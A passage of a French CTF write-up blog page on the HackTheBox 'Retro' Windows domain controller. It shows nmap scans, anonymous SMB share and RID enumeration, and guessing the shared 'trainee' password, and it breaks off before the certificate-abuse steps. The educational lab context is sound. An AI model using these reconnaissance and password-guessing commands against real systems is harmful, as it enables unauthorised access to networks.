@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Retro - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/retro/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Retro">
+  <meta property="og:description" content="Retro est une machine Windows de difficulté facile présentant un contrôleur de domaine Active Directory. Grâce à l’énumération SMB et à l’exploitation d’un compte machine pré-créé, nous obtenons l’accès au système. L’escalade de privilèges est réalisée via l’exploitation d’Active Directory Certificate Service, en utilisant spécifiquement l’attaque ESC1, qui exploite les modèles de certificats pour usurper l’identité de l’utilisateur Administrateur.
+Enumération Nmap J’effectue premièrement un simple scan nmap pour avoir tous les ports ouverts. Il y en a plusieurs :">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="ESC1">
+    <meta property="article:tag" content="ADCS">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Retro">
+  <meta name="twitter:description" content="Retro est une machine Windows de difficulté facile présentant un contrôleur de domaine Active Directory. Grâce à l’énumération SMB et à l’exploitation d’un compte machine pré-créé, nous obtenons l’accès au système. L’escalade de privilèges est réalisée via l’exploitation d’Active Directory Certificate Service, en utilisant spécifiquement l’attaque ESC1, qui exploite les modèles de certificats pour usurper l’identité de l’utilisateur Administrateur.
+Enumération Nmap J’effectue premièrement un simple scan nmap pour avoir tous les ports ouverts. Il y en a plusieurs :">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/retro/" /><link rel="prev" href="http://localhost:1313/retrotwo/" /><link rel="next" href="http://localhost:1313/reset/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Retro",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/retro\/"
+        },"genre": "posts","keywords": "Easy, Windows, Active Directory, ESC1, ADCS","wordcount":  2236 ,
+        "url": "http:\/\/localhost:1313\/retro\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Retro</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;2236 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#enumération">Enumération</a>
+          <ul>
+            <li><a href="#nmap">Nmap</a></li>
+            <li><a href="#smb-445">SMB (445)</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-administrator">Shell en tant que administrator</a>
+          <ul>
+            <li><a href="#bloodhound">BloodHound</a></li>
+            <li><a href="#pre-created-computer-account">Pre Created Computer Account</a></li>
+            <li><a href="#esc1">ESC1</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Retro/retro.png"
+        data-srcset="/images/Retro/retro.png, /images/Retro/retro.png 1.5x, /images/Retro/retro.png 2x"
+        data-sizes="auto"
+        alt="/images/Retro/retro.png"
+        title="Retro" width="610" height="302" /></p>
+<p>Retro est une machine Windows de difficulté facile présentant un contrôleur de domaine Active Directory. Grâce à l&rsquo;énumération SMB et à l&rsquo;exploitation d&rsquo;un compte machine pré-créé, nous obtenons l&rsquo;accès au système. L&rsquo;escalade de privilèges est réalisée via l&rsquo;exploitation d&rsquo;Active Directory Certificate Service, en utilisant spécifiquement l&rsquo;attaque <code>ESC1</code>, qui exploite les modèles de certificats pour usurper l&rsquo;identité de l&rsquo;utilisateur Administrateur.</p>
+<h2 id="enumération">Enumération</h2>
+<h3 id="nmap">Nmap</h3>
+<p>J&rsquo;effectue premièrement un simple scan <code>nmap</code> pour avoir tous les ports ouverts. Il y en a plusieurs :</p>
+<ul>
+<li>53 pour le DNS</li>
+<li>88 pour Kerberos</li>
+<li>389 pour LDAP</li>
+<li>445 pour le SMB</li>
+<li>636 pour LDAPS</li>
+<li>Et d&rsquo;autres ports</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ nmap 10.129.26.76 --min-rate 5000 -p-
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-24 18:40 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.129.26.76
+</span></span><span class="line"><span class="cl">Host is up (0.080s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65514 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
+</span></span><span class="line"><span class="cl">53/tcp    open  domain
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws
+</span></span><span class="line"><span class="cl">49664/tcp open  unknown
+</span></span><span class="line"><span class="cl">49667/tcp open  unknown
+</span></span><span class="line"><span class="cl">49668/tcp open  unknown
+</span></span><span class="line"><span class="cl">49819/tcp open  unknown
+</span></span><span class="line"><span class="cl">49828/tcp open  unknown
+</span></span><span class="line"><span class="cl">55113/tcp open  unknown
+</span></span><span class="line"><span class="cl">64619/tcp open  unknown
+</span></span><span class="line"><span class="cl">64637/tcp open  unknown</span></span></code></pre></div></div>
+<p>Maintenant j&rsquo;effectue un second scan pour avoir plus de détails sur ces ports.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ nmap 10.129.26.76 --min-rate 5000 -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,49668,49819,49828,55113,64619,64637
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-24 18:44 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.129.26.76
+</span></span><span class="line"><span class="cl">Host is up (0.042s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-24 16:44:18Z)
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">|_ssl-date: TLS randomness does not represent time
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC.retro.vl
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl
+</span></span><span class="line"><span class="cl">| Not valid before: 2024-10-02T10:33:09
+</span></span><span class="line"><span class="cl">|_Not valid after:  2025-10-02T10:33:09
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC.retro.vl
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl
+</span></span><span class="line"><span class="cl">| Not valid before: 2024-10-02T10:33:09
+</span></span><span class="line"><span class="cl">|_Not valid after:  2025-10-02T10:33:09
+</span></span><span class="line"><span class="cl">|_ssl-date: TLS randomness does not represent time
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC.retro.vl
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl
+</span></span><span class="line"><span class="cl">| Not valid before: 2024-10-02T10:33:09
+</span></span><span class="line"><span class="cl">|_Not valid after:  2025-10-02T10:33:09
+</span></span><span class="line"><span class="cl">|_ssl-date: TLS randomness does not represent time
+</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC.retro.vl
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl
+</span></span><span class="line"><span class="cl">| Not valid before: 2024-10-02T10:33:09
+</span></span><span class="line"><span class="cl">|_Not valid after:  2025-10-02T10:33:09
+</span></span><span class="line"><span class="cl">|_ssl-date: TLS randomness does not represent time
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC.retro.vl
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-04-08T01:55:44
+</span></span><span class="line"><span class="cl">|_Not valid after:  2025-10-08T01:55:44
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-06-24T16:45:51+00:00; 0s from scanner time.
+</span></span><span class="line"><span class="cl">| rdp-ntlm-info:
+</span></span><span class="line"><span class="cl">|   Target_Name: RETRO
+</span></span><span class="line"><span class="cl">|   NetBIOS_Domain_Name: RETRO
+</span></span><span class="line"><span class="cl">|   NetBIOS_Computer_Name: DC
+</span></span><span class="line"><span class="cl">|   DNS_Domain_Name: retro.vl
+</span></span><span class="line"><span class="cl">|   DNS_Computer_Name: DC.retro.vl
+</span></span><span class="line"><span class="cl">|   Product_Version: 10.0.20348
+</span></span><span class="line"><span class="cl">|_  System_Time: 2025-06-24T16:45:11+00:00
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49819/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49828/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">55113/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">64619/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">64637/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">| smb2-time:
+</span></span><span class="line"><span class="cl">|   date: 2025-06-24T16:45:12
+</span></span><span class="line"><span class="cl">|_  start_date: N/A
+</span></span><span class="line"><span class="cl">| smb2-security-mode:
+</span></span><span class="line"><span class="cl">|   311:
+</span></span><span class="line"><span class="cl">|_    Message signing enabled and required</span></span></code></pre></div></div>
+<p>J&rsquo;ajoute le nom de domaine ainsi que le FQDN dans le fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;10.129.26.76 retro.vl DC.retro.vl&#34; | tee -a /etc/hosts</span></span></code></pre></div></div>
+<h3 id="smb-445">SMB (445)</h3>
+<p>En énumérant les partages en tant que Guest, je vois que j&rsquo;ai un accès en lecture au partage <code>Trainees</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nxc smb retro.vl -u &#39;a&#39; -p &#39;&#39; --shares</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Retro/1.png"
+        data-srcset="/images/Retro/1.png, /images/Retro/1.png 1.5x, /images/Retro/1.png 2x"
+        data-sizes="auto"
+        alt="/images/Retro/1.png"
+        title="/images/Retro/1.png" width="1793" height="338" /></p>
+<p>Je télécharge donc le contenu de ce partage en y accédant avec <code>smbclient</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ smbclient //retro.vl/Trainees -N
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Jul <span class="m">23</span> 23:58:43 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">  ..                                DHS        <span class="m">0</span>  Wed Jun <span class="m">11</span> 16:17:10 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  Important.txt                       A      <span class="m">288</span>  Mon Jul <span class="m">24</span> 00:00:13 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="m">4659711</span> blocks of size 4096. <span class="m">1283267</span> blocks available
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get Important.txt
+</span></span><span class="line"><span class="cl">getting file <span class="se">\I</span>mportant.txt of size <span class="m">288</span> as Important.txt <span class="o">(</span>1.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.7 KiloBytes/sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> quit</span></span></code></pre></div></div>
+<p>Voici le contenu du fichier.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ cat Important.txt
+</span></span><span class="line"><span class="cl">Dear Trainees,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">I know that some of you seemed to struggle with remembering strong and unique passwords.
+</span></span><span class="line"><span class="cl">So we decided to bundle every one of you up into one account.
+</span></span><span class="line"><span class="cl">Stop bothering us. Please. We have other stuff to do than resetting your password every day.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Regards
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The Admins#</span></span></code></pre></div></div>
+<p>Lorsque je brute force les RID, j&rsquo;obtiens certains utilisateurs et groupes. Je vais les placer dans un fichier.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nxc smb retro.vl -u &#39;a&#39; -p &#39;&#39; --rid-brute</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Retro/2.png"
+        data-srcset="/images/Retro/2.png, /images/Retro/2.png 1.5x, /images/Retro/2.png 2x"
+        data-sizes="auto"
+        alt="/images/Retro/2.png"
+        title="/images/Retro/2.png" width="1802" height="799" /></p>
+<p>Dans le fichier <code>Important.txt</code>, on nous dit que le mot de passe a été rendu simple pour les membres du groupe <code>Trainees</code>. Et en plus ce mot de passe est utilisé par un compte commun. D&rsquo;après ce que je vois comme potentiels utilisateurs, je pense qu&rsquo;on part pour l&rsquo;utilisateur <code>trainee</code> avec un mot de passe très simple comme <code>12345678</code>, ou le nom du compte en lui même. Testons cela.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nxc smb retro.vl -u &#39;trainee&#39; -p &#39;trainee&#39;</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Retro/3.png"
+        data-srcset="/images/Retro/3.png, /images/Retro/3.png 1.5x, /images/Retro/3.png 2x"
+        data-sizes="auto"
+        alt="/images/Retro/3.png"
+        title="/images/Retro/3.png" width="1819" height="148" /></p>
+<p><code>trainee</code> a accès à d&rsquo;autres partages dont le partage <code>Notes</code> qui attire mon attention.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nxc smb retro.vl -u &#39;trainee&#39; -p &#39;trainee&#39; --shares</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Retro/4.png"
+        data-srcset="/images/Retro/4.png, /images/Retro/4.png 1.5x, /images/Retro/4.png 2x"
+        data-sizes="auto"
+        alt="/images/Retro/4.png"
+        title="/images/Retro/4.png" width="1795" height="390" /></p>
+<p>Je télécharge les deux fichiers qui s&rsquo;y trouvent.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ smbclient //retro.vl/Notes -U &#39;trainee%trainee&#39;
+</span></span><span class="line"><span class="cl">Try &#34;help&#34; to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: \&gt; ls
+</span></span><span class="line"><span class="cl">  .                                   D        0  Wed Apr  9 05:12:49 2025
+</span></span><span class="line"><span class="cl">  ..                                DHS        0  Wed Jun 11 16:17:10 2025
+</span></span><span class="line"><span class="cl">  ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023
+</span></span><span class="line"><span class="cl">  user.txt                            A       32  Wed Apr  9 05:13:01 2025
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                4659711 blocks of size 4096. 1283831 blocks available
+</span></span><span class="line"><span class="cl">smb: \&gt; get ToDo.txt
+</span></span><span class="line"><span class="cl">getting file \ToDo.txt of size 248 as ToDo.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
+</span></span><span class="line"><span class="cl">smb: \&gt; get user.txt
+</span></span><span class="line"><span class="cl">getting file \user.txt of size 32 as user.txt (0.2 KiloBytes/sec) (average 0.8 KiloBytes/sec)
+</span></span><span class="line"><span class="cl">smb: \&gt; quit</span></span></code></pre></div></div>
+<p>Dans le fichier <code>user.txt</code> se trouve le premier flag. Mai je vois quelque chose d&rsquo;intéressant dans le fichier <code>ToDo.txt</code>.
+D&rsquo;après ce que je vois on nous demande de nous intéresser au <a href="https://trustedsec.com/blog/diving-into-pre-created-computer-accounts" target="_blank" rel="noopener noreffer ">pre created Computer Account</a>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
